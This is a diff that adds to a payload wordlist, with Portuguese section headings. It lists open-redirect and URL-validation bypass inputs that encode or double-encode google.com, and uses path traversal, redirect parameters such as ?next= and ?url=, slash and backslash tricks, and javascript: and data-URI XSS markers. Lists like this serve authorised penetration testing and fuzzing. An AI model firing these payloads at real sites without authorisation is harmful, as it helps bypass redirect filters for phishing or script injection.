@@ -1,3 +1,49 @@
+### Básico
 http://google.com
 https://google.com
 google.com
+
+### Encoding Simples (.)
+http://google%2Ecom
+https://google%2Ecom
+google%2Ecom
+
+### Double Encoding do Ponto (.)
+http://google%252Ecom
+https://google%252Ecom
+google%252Ecom
+
+### Encoding + Double Encoding em Partes da URL
+http%3A%2F%2Fgoogle%2Ecom
+http%253A%252F%252Fgoogle%252Ecom
+%2F%2Fgoogle%2Ecom
+%252F%252Fgoogle%252Ecom
+
+### Path Traversal com Encoding do Ponto
+http://example.com/..%2Fgoogle%2Ecom
+http://example.com/..%252Fgoogle%252Ecom
+http://example.com/%2E%2E/google%2Ecom
+http://example.com/%252E%252E/google%252Ecom
+
+### Parameter Pollution com Encoding do Ponto
+?next=google%2Ecom
+?next=google%252Ecom
+?url=google%2Ecom&redirect=google%252Ecom
+
+### Slash Overload + Encoding do Ponto
+////google%2Ecom
+%2F%2F%2F%2Fgoogle%2Ecom
+%252F%252F%252F%252Fgoogle%252Ecom
+
+### Backslash, Tab e Encoding do Ponto
+http://google%2Ecom\\
+http://google%252Ecom%255C
+http://google%2Ecom%09
+
+### Encoding Total do Domínio (Incluindo o Ponto)
+%67%6F%6F%67%6C%65%2E%63%6F%6D 
+%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D 
+
+### Técnicas Avançadas (JavaScript/Data URI com Encoding)
+javascript:alert(1);//google%2Ecom
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==//google%252Ecom
